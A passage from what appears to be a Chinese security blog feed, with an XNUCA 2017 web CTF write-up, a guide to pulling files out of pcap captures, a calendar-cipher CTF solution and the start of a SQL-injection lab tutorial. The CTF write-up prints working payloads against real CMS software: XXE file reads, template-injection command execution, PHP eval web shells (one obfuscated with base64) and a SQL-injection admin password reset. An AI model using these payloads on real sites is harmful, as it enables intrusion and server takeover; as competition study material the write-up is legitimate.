<h1 id="No-5-Lucky-Number-Ca…"><a href="#No-5-Lucky-Number-Ca…" class="headerlink" title="No.5 Lucky Number Ca…"></a>No.5 Lucky Number Ca…</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">关键字词：一档CTF题</div><div class="line">===============================================================</div><div class="line"></div><div class="line">Lucky Number Calc</div><div class="line">f83f119af64fa2b94c37231bbce09678.xnuca.cn</div></pre></td></tr></table></figure>
<p>填入后，抓包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /ctf1.php HTTP/1.1</div><div class="line">Host: f83f119af64fa2b94c37231bbce09678.xnuca.cn</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept: */*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">Referer: http://f83f119af64fa2b94c37231bbce09678.xnuca.cn/</div><div class="line">Content-Length: 30</div><div class="line">Connection: close</div><div class="line"></div><div class="line">&lt;user&gt;&lt;name&gt;aaaa&lt;/name&gt;&lt;/user&gt;</div></pre></td></tr></table></figure></p>
<p>xml的形式，就觉得是xxe漏洞，不过早上弄得时候没弄出来。下午lzhtony给了一个能读取文件的payload，但没发现flag在哪。</p>
<p>然后就开始找咯，对照自己的linux的目录一个一个翻，最后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">POST /ctf1.php HTTP/1.1</div><div class="line">Host: f83f119af64fa2b94c37231bbce09678.xnuca.cn</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept: */*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">Referer: http://f83f119af64fa2b94c37231bbce09678.xnuca.cn/</div><div class="line">Content-Length: 134</div><div class="line">Connection: close</div><div class="line"></div><div class="line">&lt;!DOCTYPE ANY [</div><div class="line">&lt;!ENTITY x SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/hosts&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;user&gt;&lt;name&gt;&amp;x;&lt;/name&gt;&lt;/user&gt;</div></pre></td></tr></table></figure></p>
<p>解码得：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">127.0.0.1	localhost</div><div class="line">127.0.0.1       xnuca&#123;N3sSMD165KesSXlyOgwMGTepI2HTJC0b&#125;.xip.io</div><div class="line"></div><div class="line"># The following lines are desirable for IPv6 capable hosts</div><div class="line">::1     localhost ip6-localhost ip6-loopback</div><div class="line">ff02::1 ip6-allnodes</div><div class="line">ff02::2 ip6-allrouters</div></pre></td></tr></table></figure></p>
<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xnuca&#123;N3sSMD165KesSXlyOgwMGTepI2HTJC0b&#125;</div></pre></td></tr></table></figure></p>
<p>看这个flag的位置和hosts的配置，感觉是要利用xxe来探测内网来获得flag的。</p>
<h1 id="No-6-Hello-World"><a href="#No-6-Hello-World" class="headerlink" title="No.6 Hello World"></a>No.6 Hello World</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">关键字词：二档CTF题</div><div class="line">===============================================================</div><div class="line"></div><div class="line">即使是Hello world也要好好管理代码！</div><div class="line"></div><div class="line"></div><div class="line">91101217df5a534c58f8b0e0922e1161.xnuca.cn</div></pre></td></tr></table></figure>
<p>说要管理代码，git泄露。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl rip-git.pl http://91101217df5a534c58f8b0e0922e1161.xnuca.cn/.git</div></pre></td></tr></table></figure></p>
<p>没做出来。</p>
<h1 id="No-8-看视频真嗨皮"><a href="#No-8-看视频真嗨皮" class="headerlink" title="No.8 看视频真嗨皮"></a>No.8 看视频真嗨皮</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">695c354c811a33d792d9e0efb2305cfb.xnuca.cn</div><div class="line">请在目标入口/writeHere/目录下创建名为00111e86d51fa2b62add879572a0d29e的文件</div></pre></td></tr></table></figure>
<p>海洋cms，见了好多次了。创建文件的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://695c354c811a33d792d9e0efb2305cfb.xnuca.cn/writeHere/00111e86d51fa2b62add879572a0d29e</div><div class="line"></div><div class="line">POST:</div><div class="line">searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=file_put_contents(&quot;writeHere/00111e86d51fa2b62add879572a0d29e&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;);</div></pre></td></tr></table></figure></p>
<p>查找flag的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">view-source:http://695c354c811a33d792d9e0efb2305cfb.xnuca.cn/search.php?searchtype=5</div><div class="line"></div><div class="line">POST:</div><div class="line">searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=system(&quot;find / | grep flag&quot;);</div></pre></td></tr></table></figure></p>
<p>读取flag的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">view-source:http://695c354c811a33d792d9e0efb2305cfb.xnuca.cn/search.php?searchtype=5</div><div class="line"></div><div class="line">POST:</div><div class="line">searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=system(&quot;cat /etc/flag.txt&quot;);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/11.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xnuca&#123;36d1ecfbe0fc9b79054ff70bb204af25&#125;</div></pre></td></tr></table></figure></p>
<h1 id="No-9-The-Best-Commun…"><a href="#No-9-The-Best-Commun…" class="headerlink" title="No.9 The Best Commun…"></a>No.9 The Best Commun…</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">96433e53a974329f13590be3e215aebd.xnuca.cn</div></pre></td></tr></table></figure>
<p>查到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.exploit-db.com/exploits/40756/</div></pre></td></tr></table></figure></p>
<p>利用里面的exp进行获取flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">0x4148@96433e53a974329f13590be3e215aebd.xnuca.cn# cat /etc/flag.txt</div><div class="line">xnuca&#123;123e5ebb3f34a07990e477e85eb60170&#125;</div><div class="line"></div><div class="line"></div><div class="line">0x4148@96433e53a974329f13590be3e215aebd.xnuca.cn# echo &quot;a&quot; &gt; ../writeHere/00111e86d51fa2b62add879572a0d29e</div><div class="line"></div><div class="line"></div><div class="line">0x4148@96433e53a974329f13590be3e215aebd.xnuca.cn# ls ../writeHere/</div><div class="line">00111e86d51fa2b62add879572a0d29e</div></pre></td></tr></table></figure></p>
<h1 id="No-11-两只小蜜蜂啊"><a href="#No-11-两只小蜜蜂啊" class="headerlink" title="No.11 两只小蜜蜂啊"></a>No.11 两只小蜜蜂啊</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">adee757b88f7716820dc6d9bec43684d.xnuca.cn</div><div class="line"></div><div class="line">请在目标入口/writeHere/目录下创建名为00111e86d51fa2b62add879572a0d29e的文件</div></pre></td></tr></table></figure>
<p>查到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://bbs.ichunqiu.com/thread-13977-1-1.html</div></pre></td></tr></table></figure></p>
<p>利用文章里的exp，成功获取到shell。然后就拿到flag了。不过忘记截图了。</p>
<h1 id="No-12-社工库"><a href="#No-12-社工库" class="headerlink" title="No.12 社工库"></a>No.12 社工库</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">关键字词：二档靶标题</div><div class="line">===============================================================</div><div class="line"></div><div class="line">社工之余吃个芒果休息一下吧！</div></pre></td></tr></table></figure>
<p>没做出来。</p>
<h1 id="No-18-“开讲啦”"><a href="#No-18-“开讲啦”" class="headerlink" title="No.18 “开讲啦”"></a>No.18 “开讲啦”</h1><p>查到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.exploit-db.com/exploits/24869/</div></pre></td></tr></table></figure></p>
<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://8d52640a73d8073066c951df0501184a.xnuca.cn/oauth/lti/common/tool_provider_outcome.php</div><div class="line"></div><div class="line">POST:</div><div class="line">grade=1&amp;key=1&amp;secret=secret&amp;sourcedid=1&amp;submit=Send%20Grade&amp;url=/etc/flag.txt</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xnuca&#123;Co8n0g5r72a4tul3at2ions!Y0ug0tMe&#125;</div></pre></td></tr></table></figure></p>
<p>但是因为只找到任意文件读取漏洞，所以只能做读取flag的操作。写的操作没有成功。</p>
<h1 id="No-23-找入口"><a href="#No-23-找入口" class="headerlink" title="No.23 找入口"></a>No.23 找入口</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.websecgeeks.com/2015/08/wolf-cms-arbitrary-file-upload-to.html</div></pre></td></tr></table></figure>
<p>弱密码：admin：admin 登陆后直接上传k.php，内容为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'AAA'</span>]) <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>访问，写入文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://cef033ea85498682c1c33309def1a109.xnuca.cn/public/k.php?AAA=file_put_contents(&quot;writeHere/00111e86d51fa2b62add879572a0d29e&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;);</div></pre></td></tr></table></figure></p>
<p>访问，读取flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://cef033ea85498682c1c33309def1a109.xnuca.cn/public/k.php?AAA=system(&quot;cat /etc/flag.txt&quot;);</div></pre></td></tr></table></figure></p>
<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xnuca&#123;24567gtfvretyasdsgrtyjyufdgrth23&#125;</div></pre></td></tr></table></figure></p>
<h1 id="No-24-可爱的星星"><a href="#No-24-可爱的星星" class="headerlink" title="No.24 可爱的星星"></a>No.24 可爱的星星</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">37af3efae1d906343d29b6b1a96fcd54.xnuca.cn</div><div class="line"></div><div class="line">请在目标入口/writeHere/目录下创建名为00111e86d51fa2b62add879572a0d29e的文件</div></pre></td></tr></table></figure>
<p>没做出来。</p>
<h1 id="No-25-愉快的玩耍吧"><a href="#No-25-愉快的玩耍吧" class="headerlink" title="No.25 愉快的玩耍吧"></a>No.25 愉快的玩耍吧</h1><p>重置Admin密码为1234567：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=md5(1234567)+where+id=1;+%23--</div></pre></td></tr></table></figure>
<p>登录，并上传一个压缩了一句话php文件的压缩包到以下地址，会自动解压</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/include/uploadify.php?type=skin&amp;wate=undefined&amp;module=undefined&amp;lang=cn</div></pre></td></tr></table></figure>
<p>插入一句话的代码是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $e = $_REQUEST[<span class="string">'e'</span>]; $arr = <span class="keyword">array</span>($_REQUEST[<span class="string">'pass'</span>],); array_filter($arr, base64_decode($e)); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>用以下地址得到shell：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/templates/test.php?e=YXNzZXJ0</div></pre></td></tr></table></figure>
<p>然后读取/etc/flag.txt，并写入文件即可。</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>吐槽点：</p>
<ul>
<li>比赛服务器：）</li>
<li>扫一扫就被办：）</li>
<li>重点是找poc/exp…..</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XNUCA2017-第一期：Web-writeup 难度中等偏下&lt;/p&gt;
&lt;p&gt;题目类型：CTF题，渗透/模板题&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>流量包提取文件方法</title>
    <link href="http://yoursite.com/2017/08/25/%E6%B5%81%E9%87%8F%E5%8C%85%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2017/08/25/流量包提取文件方法/</id>
    <published>2017-08-25T09:18:24.000Z</published>
    <updated>2017-08-25T10:30:59.016Z</updated>
    
    <content type="html"><![CDATA[<p>流量包提取文件方法<br><a id="more"></a></p>
<h1 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h1><p>wrieshark自带有文件分离功能。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/3.png?raw=true" alt=""></p>
<h1 id="tcpxtract"><a href="#tcpxtract" class="headerlink" title="tcpxtract"></a>tcpxtract</h1><p>通过下面命令安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install tcpxtract</div></pre></td></tr></table></figure></p>
<p>使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpxtract -f XXX.pcap</div></pre></td></tr></table></figure></p>
<p>以hitctf2017的Cephalopod为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/hitb2017/misc/Cephalopod# tcpxtract -f 2a9c1cdd-2ac0-4b2a-828d-269c6e04ebbb.pcap</div><div class="line">Found file of type &quot;png&quot; in session [10.0.2.7:49818 -&gt; 10.0.2.10:36890], exporting to 00000000.png</div><div class="line">Found file of type &quot;png&quot; in session [10.0.2.7:49818 -&gt; 10.0.2.10:36890], exporting to 00000001.png</div></pre></td></tr></table></figure></p>
<p>即可得到藏在流量包里的文件：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/1.png?raw=true" alt=""></p>
<h1 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h1><p>foremost是基于文件头及尾部信息恢复文件的工具。</p>
<p>使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">foremost -i XXX.pcap</div></pre></td></tr></table></figure></p>
<p>以hitbctf2017的simple_transfer为例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# foremost -i b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap</div><div class="line">Processing: b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap</div><div class="line">|*|</div><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# ls</div><div class="line">b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap  output</div><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# cd output/</div><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer/output# ls</div><div class="line">audit.txt  pdf</div></pre></td></tr></table></figure>
<p>即可恢复出藏在流量包里的文件。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/2.png?raw=true" alt=""></p>
<h1 id="Network-miner"><a href="#Network-miner" class="headerlink" title="Network miner"></a>Network miner</h1><p>下载地址：<a href="https://sourceforge.net/projects/networkminer/" target="_blank" rel="external">https://sourceforge.net/projects/networkminer/</a></p>
<p>还有一些方法，遇到后再慢慢补充。</p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="http://bbs.pediy.com/thread-220021.htm" target="_blank" rel="external">CTF取证类题目指南</a></li>
<li><a href="http://bobao.360.cn/learning/detail/206.html" target="_blank" rel="external">返璞归真——流量中提取文件的五种方法</a></li>
<li><a href="https://www.blackbytes.info/2012/01/four-ways-to-extract-files-from-pcaps/" target="_blank" rel="external">Four ways to extract files from pcaps</a></li>
<li><a href="https://github.com/caesar0301/awesome-pcaptools" target="_blank" rel="external">awesome-pcaptools</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;流量包提取文件方法&lt;br&gt;
    
    </summary>
    
      <category term="技术杂谈" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
      <category term="pcap" scheme="http://yoursite.com/tags/pcap/"/>
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>HITB CTF 2017-Dating in Singapore-writeup</title>
    <link href="http://yoursite.com/2017/08/24/HITB-CTF-2017-Dating-in-Singapore-writeup/"/>
    <id>http://yoursite.com/2017/08/24/HITB-CTF-2017-Dating-in-Singapore-writeup/</id>
    <published>2017-08-24T08:58:25.000Z</published>
    <updated>2017-08-25T10:30:52.002Z</updated>
    
    <content type="html"><![CDATA[<p>HITB CTF 2017-Dating in Singapore-writeup<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">01081522291516170310172431-050607132027162728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>根据分隔符<code>-</code>分开每行，并且两两数字一组：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">01 08 15 22 29 15 16 17 03 10 17 24 31</div><div class="line"></div><div class="line">05 06 07 13 20 27 16 27 28</div><div class="line"></div><div class="line">01 02 03 02 09 16 23 30</div><div class="line"></div><div class="line">02 09 16 23 02 03 10 09 09 10 17 24 23</div><div class="line"></div><div class="line">02 01 08 14 22 29 30</div><div class="line"></div><div class="line">06 05 04 11 18 25 26 27</div><div class="line"></div><div class="line">02 03 04 03 10 17 24 31</div><div class="line"></div><div class="line">01 02 03 01 08 15 22 29 15 16 17</div><div class="line"></div><div class="line">04 05 06 04 11 18 25 18 19 20</div><div class="line"></div><div class="line">01 08 15 22 29 30 31 24 17 10 03</div><div class="line"></div><div class="line">26 19 12 05 20 28 21 14 07</div><div class="line"></div><div class="line">04 05 12 13 19 26 25</div></pre></td></tr></table></figure></p>
<p>数字的特征，最小为01，最大为31，一共十二行，恰对应12个月，每个月最多31天。结合今年（2017）日历</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170824/1.png?raw=true" alt=""></p>
<p>第一行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">01 08 15 22 29 15 16 17 03 10 17 24 31</div></pre></td></tr></table></figure></p>
<p>对照一月份，“写出”得到字母：<code>H</code>。</p>
<p>其余类似。</p>
<p>最后的flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HITB&#123;CTFFUN&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HITB CTF 2017-Dating in Singapore-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Crypto" scheme="http://yoursite.com/categories/writeup-Crypto/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less17-writeup</title>
    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less17-writeup/"/>
    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less17-writeup/</id>
    <published>2017-08-23T10:16:52.000Z</published>
    <updated>2017-08-23T13:46:04.707Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less-17 POST-Update Query-Error Based-String<br><a id="more"></a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>三种基本语句。</p>
<h2 id="INSERT"><a href="#INSERT" class="headerlink" title="INSERT"></a>INSERT</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">INSERT INTO table_name ( field1, field2,...fieldN )</div><div class="line">                       VALUES</div><div class="line">                       ( value1, value2,...valueN );</div></pre></td></tr></table></figure>
<p>示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; desc users;</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">| Field    | Type        | Null | Key | Default | Extra          |</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">| id       | int(3)      | NO   | PRI | NULL    | auto_increment |</div><div class="line">| username | varchar(20) | NO   |     | NULL    |                |</div><div class="line">| password | varchar(20) | NO   |     | NULL    |                |</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">3 rows in set (0.06 sec)</div><div class="line"></div><div class="line">mysql&gt; insert into users(id,username,password) value(0,&quot;chybeta&quot;,&quot;chybeta&quot;);</div><div class="line">Query OK, 1 row affected (0.09 sec)</div></pre></td></tr></table></figure></p>
<h2 id="UPDATE"><a href="#UPDATE" class="headerlink" title="UPDATE"></a>UPDATE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">UPDATE table_name SET field1=new-value1, field2=new-value2</div><div class="line">[WHERE Clause]</div></pre></td></tr></table></figure>
<p>示例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select id,username,password from users where id=15;                  </div><div class="line">+----+----------+----------+                                                </div><div class="line">| id | username | password |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">| 15 | chybeta  | chybeta  |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">1 row in set (0.00 sec)                                                     </div><div class="line"></div><div class="line">mysql&gt; update users set username=&quot;atebyhc&quot; where id=15;                     </div><div class="line">Query OK, 1 row affected (0.08 sec)                                         </div><div class="line">Rows matched: 1  Changed: 1  Warnings: 0                                    </div><div class="line"></div><div class="line">mysql&gt; select id,username,password from users where id=15;                  </div><div class="line">+----+----------+----------+                                                </div><div class="line">| id | username | password |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">| 15 | atebyhc  | chybeta  |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">1 row in set (0.00 sec)                                                     </div><div class="line"></div><div class="line">mysql&gt; update users set username=&quot;chybeta&quot;,password=&quot;atebyhc&quot; where id=15;  </div><div class="line">Query OK, 1 row affected (0.00 sec)                                         </div><div class="line">Rows matched: 1  Changed: 1  Warnings: 0                                    </div><div class="line"></div><div class="line">mysql&gt; select id,username,password from users where id=15;                  </div><div class="line">+----+----------+----------+                                                </div><div class="line">| id | username | password |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">| 15 | chybeta  | atebyhc  |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
<h2 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DROP TABLE table_name ;</div></pre></td></tr></table></figure>
<p>这个。。暂时先不演示了。。</p>
